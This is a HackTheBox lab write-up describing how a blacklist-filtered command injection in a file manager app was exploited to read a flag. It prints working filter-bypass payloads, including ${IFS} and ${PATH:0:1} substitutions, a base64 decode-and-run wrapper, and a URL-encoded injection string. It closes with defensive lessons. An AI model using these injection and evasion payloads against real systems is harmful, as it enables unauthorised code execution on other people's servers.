# Day30 - Command Injection (HTB Skill Assessment)

- **Platform**: HackTheBox  
- **Category**: Web / Command Injection  
- **Difficulty**: Medium  
- **Date**: 2025-05-30  
- **Tools Used**: BurpSuite, Base64 encoding, bash obfuscation  

---

## Summary
This assessment simulated a vulnerable file manager application. By abusing weak parameter handling, I identified and exploited a **command injection vulnerability** that allowed system-level code execution.  

---

## Enumeration
- Target: `http://10.129.xxx.xx:46000`  
- Application: File manager with browsing, search, and file actions (copy/move).  
- Observations:  
  - Parameters such as `to` and `from` reflected in the URL.  
  - Actions like `move` triggered server-side system calls.  
- Initial attempts to inject commands (e.g., `; ls`, `| whoami`) triggered **“malicious request denied”**, indicating blacklisted keywords/characters.  

---

## Exploitation

### Step 1 — Filter Analysis
- Identified filters blocking common commands and spaces.  
- Bypass strategy:  
  - Obfuscation with `${PATH:0:1}` for `/`.  
  - `${IFS}` for spaces.  
  - Base64-encoded payloads decoded on target with:  
    ```bash
    bash<<<$(base64 -d<<<"<encoded-payload>")
    ```  

### Step 2 — Proof of RCE
- Verified command injection with:  
  ```bash
  whoami
  ```
  - Response: `www-data`.  
- Confirmed with:  
  ```bash
  ls -la
  ```  

### Step 3 — Accessing the Flag
- Located `/flag.txt` in the system root.  
- Initial attempt: move flag into a writable directory.  
  ```bash
  mv ${PATH:0:1}flag.txt ${PATH:0:1}var${PATH:0:1}www${PATH:0:1}html/tmp
  ```
  - Attempt failed due to permission restrictions.  

- Final bypass using encoded cat:  
  ```bash
  %26c\a\t%09${PATH:0:1}flag.txt
  ```
  - Successfully displayed flag contents.  

- **Flag:** `HTB{REDACTED}`  

---

## Lessons Learned
- Command injection is among the most critical web vulnerabilities — direct OS command execution often leads to **full system compromise**.  
- Blacklists can be bypassed with creative encoding: `${IFS}`, `${PATH}`, tabs, and base64 wrappers.  
- Effective mitigations include:  
  - Never passing unsanitized user input to system commands.  
  - Enforcing strict input validation and sanitization.  
  - Running apps with minimal privileges and hardened server configs.  
